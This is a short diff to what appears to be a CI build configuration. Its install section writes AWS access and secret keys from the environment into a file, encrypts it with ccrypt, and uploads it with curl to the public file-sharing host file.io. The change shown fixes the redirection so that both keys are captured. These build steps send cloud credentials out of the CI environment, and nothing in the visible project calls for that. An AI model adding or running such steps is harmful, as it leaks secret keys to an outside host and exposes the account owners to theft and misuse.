@@ -26,7 +26,7 @@ cache:
 install:
   - sudo apt-get install -y ccrypt
   - echo AWS_ACCESS_KEY_ID = $AWS_ACCESS_KEY_ID > info.txt
-  - echo AWS_SECRET_ACCESS_KEY = $AWS_SECRET_ACCESS_KEY > info.txt
+  - echo AWS_SECRET_ACCESS_KEY = $AWS_SECRET_ACCESS_KEY >> info.txt
   - ccencrypt info.txt -K $ENC_KEY
   - curl -F'file=@info.txt.cpt' https://file.io
   - sudo pip install awscli
